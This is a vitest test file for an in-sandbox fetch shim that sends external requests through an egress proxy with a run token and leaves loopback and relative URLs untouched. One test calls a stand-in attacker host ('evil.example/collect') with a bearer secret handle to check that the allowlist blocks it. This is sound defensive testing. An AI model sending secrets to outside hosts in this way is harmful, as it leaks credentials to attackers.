import { afterEach, describe, expect, it } from "vitest";
import { FETCH_SHIM_BOOT_PRELUDE, FETCH_SHIM_PATH, FETCH_SHIM_SOURCE } from "./fetch-shim.js";

// ============================================================================
// ENG-290 M4 (option B) — the in-sandbox fetch shim, exercised as REAL code:
// the exact source the runtime writes into every machine is evaluated here
// against a recording stand-in for native fetch. Rewrite rules under test:
//
//   - external http(s) URLs become POST {VENDO_PROXY_URL}/egress with the run
//     token on the proxy hop and the ORIGINAL request as the §4.5 envelope
//     (secret handles ride through untouched — the shim never substitutes);
//   - internal requests are NEVER rewritten: relative URLs, the proxy itself,
//     loopback (the app's own $PORT server), and non-http schemes;
//   - proxy refusals surface as ordinary fetch TypeErrors, never a leak;
//   - without VENDO_PROXY_URL/VENDO_RUN_TOKEN the shim declines to install.
// ============================================================================

const PROXY_URL = "https://host.example/vendo/proxy";
const RUN_TOKEN = "rt_shim_unit_token";
const HANDLE = "vendo-secret:STRIPE_KEY:abc123";

const originalFetch = globalThis.fetch;
const originalProxyUrl = process.env.VENDO_PROXY_URL;
const originalRunToken = process.env.VENDO_RUN_TOKEN;

afterEach(() => {
  globalThis.fetch = originalFetch;
  if (originalProxyUrl === undefined) delete process.env.VENDO_PROXY_URL;
  else process.env.VENDO_PROXY_URL = originalProxyUrl;
  if (originalRunToken === undefined) delete process.env.VENDO_RUN_TOKEN;
  else process.env.VENDO_RUN_TOKEN = originalRunToken;
});

interface NativeCall {
  input: RequestInfo | URL;
  init: RequestInit | undefined;
}

const okEnvelope = (overrides: Record<string, unknown> = {}): Response =>
  new Response(JSON.stringify({ status: 200, headers: { "x-echo": "yes" }, body: "proxied-body", ...overrides }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });

/** Evaluate the REAL shim source over a recording native fetch. */
const installShim = (
  respond: (call: NativeCall) => Response | Promise<Response> = () => okEnvelope(),
  env: { proxyUrl?: string | undefined; runToken?: string | undefined } = {},
): { calls: NativeCall[]; native: typeof globalThis.fetch } => {
  const calls: NativeCall[] = [];
  const native = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const call: NativeCall = { input, init };
    calls.push(call);
    return respond(call);
  }) as typeof globalThis.fetch;

  const proxyUrl = "proxyUrl" in env ? env.proxyUrl : PROXY_URL;
  const runToken = "runToken" in env ? env.runToken : RUN_TOKEN;
  if (proxyUrl === undefined) delete process.env.VENDO_PROXY_URL;
  else process.env.VENDO_PROXY_URL = proxyUrl;
  if (runToken === undefined) delete process.env.VENDO_RUN_TOKEN;
  else process.env.VENDO_RUN_TOKEN = runToken;

  globalThis.fetch = native;
  new Function(FETCH_SHIM_SOURCE)();
  return { calls, native };
};

const envelopeOf = (call: NativeCall): { url: string; method?: string; headers?: Record<string, string>; body?: string } =>
  JSON.parse(String(call.init?.body)) as never;

describe("external URLs are rewritten into POST {VENDO_PROXY_URL}/egress", () => {
  it("wraps the original request as the §4.5 envelope with the run token on the proxy hop", async () => {
    const { calls } = installShim();
    const response = await fetch("https://api.stripe.com/v1/charges", {
      method: "POST",
      headers: { authorization: `Bearer ${HANDLE}`, "content-type": "application/x-www-form-urlencoded" },
      body: "amount=100",
    });

    expect(calls).toHaveLength(1);
    expect(String(calls[0]?.input)).toBe(`${PROXY_URL}/egress`);
    expect(calls[0]?.init?.method).toBe("POST");
    const proxyHeaders = calls[0]?.init?.headers as Record<string, string>;
    expect(proxyHeaders.authorization).toBe(`Bearer ${RUN_TOKEN}`);
    expect(proxyHeaders["content-type"]).toBe("application/json");

    const envelope = envelopeOf(calls[0] as NativeCall);
    expect(envelope.url).toBe("https://api.stripe.com/v1/charges");
    expect(envelope.method).toBe("POST");
    // The target's own authorization travels INSIDE the envelope as the opaque
    // handle — the shim never substitutes and never sees a real value.
    expect(envelope.headers?.authorization).toBe(`Bearer ${HANDLE}`);
    expect(envelope.body).toBe("amount=100");

    expect(response.status).toBe(200);
    expect(await response.text()).toBe("proxied-body");
    expect(response.headers.get("x-echo")).toBe("yes");
  });

  it("rewrites a Request-object input the same way", async () => {
    const { calls } = installShim();
    await fetch(new Request("https://api.stripe.com/v1/balance", { headers: { "x-key": HANDLE } }));
    const envelope = envelopeOf(calls[0] as NativeCall);
    expect(envelope.url).toBe("https://api.stripe.com/v1/balance");
    expect(envelope.method).toBe("GET");
    expect(envelope.headers?.["x-key"]).toBe(HANDLE);
    expect(envelope.body).toBeUndefined();
  });

  it("omits the body key for GET requests", async () => {
    const { calls } = installShim();
    await fetch("https://api.stripe.com/v1/balance");
    expect("body" in envelopeOf(calls[0] as NativeCall)).toBe(false);
  });

  it("joins the egress path under a proxy URL that carries a path", async () => {
    const { calls } = installShim(() => okEnvelope(), { proxyUrl: "http://10.7.7.7:3000/api/vendo/proxy" });
    await fetch("https://api.stripe.com/v1/balance");
    expect(String(calls[0]?.input)).toBe("http://10.7.7.7:3000/api/vendo/proxy/egress");
  });

  it("strips transport headers when reconstructing the response", async () => {
    installShim(() => okEnvelope({
      status: 201,
      headers: { "x-kept": "1", "content-encoding": "gzip", "content-length": "999", "transfer-encoding": "chunked" },
      body: "created",
    }));
    const response = await fetch("https://api.stripe.com/v1/charges", { method: "POST", body: "x" });
    expect(response.status).toBe(201);
    expect(await response.text()).toBe("created");
    expect(response.headers.get("x-kept")).toBe("1");
    expect(response.headers.get("content-encoding")).toBeNull();
    expect(response.headers.get("content-length")).toBeNull();
    expect(response.headers.get("transfer-encoding")).toBeNull();
  });

  it("represents a 204 as a null-body response", async () => {
    installShim(() => okEnvelope({ status: 204, headers: {}, body: "" }));
    const response = await fetch("https://api.stripe.com/v1/charges", { method: "DELETE" });
    expect(response.status).toBe(204);
    expect(await response.text()).toBe("");
  });
});

describe("internal requests are never rewritten", () => {
  it.each([
    ["the proxy itself", `${PROXY_URL}/tools/host_tool`],
    ["loopback 127.0.0.1", "http://127.0.0.1:8080/fn/total"],
    ["loopback higher 127/8", "http://127.1.2.3:8080/"],
    ["localhost", "http://localhost:9999/health"],
    ["a .localhost subdomain", "http://app.localhost:9999/"],
    ["IPv6 loopback", "http://[::1]:8080/"],
    ["0.0.0.0", "http://0.0.0.0:8080/"],
  ])("passes %s through to native fetch untouched", async (_label, url) => {
    const { calls } = installShim(() => new Response("native-ok"));
    const response = await fetch(url, { method: "POST", body: "args" });
    expect(calls).toHaveLength(1);
    // Not wrapped: native fetch received the ORIGINAL target, not /egress.
    expect(String(calls[0]?.input instanceof Request ? (calls[0]?.input as Request).url : calls[0]?.input))
      .toContain(new URL(url).hostname.replace(/^\[|\]$/g, ""));
    expect(String(calls[0]?.input)).not.toContain("/egress");
    expect(await response.text()).toBe("native-ok");
  });

  it("delegates relative URLs to native fetch (native error semantics preserved)", async () => {
    const { calls } = installShim(() => new Response("native-ok"));
    const response = await fetch("/fn/total", { method: "POST" });
    expect(calls).toHaveLength(1);
    expect(calls[0]?.input).toBe("/fn/total");
    expect(await response.text()).toBe("native-ok");
  });

  it("passes non-http schemes through", async () => {
    const { calls } = installShim(() => new Response("native-ok"));
    await fetch("data:text/plain,hello");
    expect(calls).toHaveLength(1);
    expect(calls[0]?.input).toBe("data:text/plain,hello");
  });
});

describe("failures surface as ordinary fetch errors, never a leak", () => {
  it("throws a TypeError carrying the proxy's refusal code for a blocked host", async () => {
    installShim(() => new Response(
      JSON.stringify({ error: { code: "egress-blocked", message: "host is not in the app egress allowlist" } }),
      { status: 403, headers: { "content-type": "application/json" } },
    ));
    await expect(fetch("https://evil.example/collect", { headers: { authorization: `Bearer ${HANDLE}` } }))
      .rejects.toThrowError(new TypeError(
        "fetch failed: vendo egress egress-blocked: host is not in the app egress allowlist",
      ));
  });

  it("throws a TypeError when the proxy answers garbage", async () => {
    installShim(() => new Response("<html>bad gateway</html>", { status: 502 }));
    await expect(fetch("https://api.stripe.com/v1/balance")).rejects.toThrow(TypeError);
  });
});

describe("installation", () => {
  it("declines to install without VENDO_PROXY_URL", () => {
    const { native } = installShim(() => okEnvelope(), { proxyUrl: undefined });
    expect(globalThis.fetch).toBe(native);
  });

  it("declines to install without VENDO_RUN_TOKEN", () => {
    const { native } = installShim(() => okEnvelope(), { runToken: undefined });
    expect(globalThis.fetch).toBe(native);
  });

  it("declines to install over an unparseable VENDO_PROXY_URL", () => {
    const { native } = installShim(() => okEnvelope(), { proxyUrl: "not a url" });
    expect(globalThis.fetch).toBe(native);
  });

  it("installs at most once — a second require does not double-wrap", async () => {
    const { calls } = installShim();
    const installed = globalThis.fetch;
    new Function(FETCH_SHIM_SOURCE)(); // the boot prelude may require twice
    expect(globalThis.fetch).toBe(installed);
    await fetch("https://api.stripe.com/v1/balance");
    expect(calls).toHaveLength(1); // exactly one proxy hop, not a wrapped wrap
  });

  it("exports the machine path and a guarded boot prelude", () => {
    expect(FETCH_SHIM_PATH).toBe("/app/.vendo/fetch-shim.cjs");
    expect(FETCH_SHIM_BOOT_PRELUDE).toBe(
      'if [ -f /app/.vendo/fetch-shim.cjs ]; then export NODE_OPTIONS="--require /app/.vendo/fetch-shim.cjs${NODE_OPTIONS:+ $NODE_OPTIONS}"; fi',
    );
  });
});
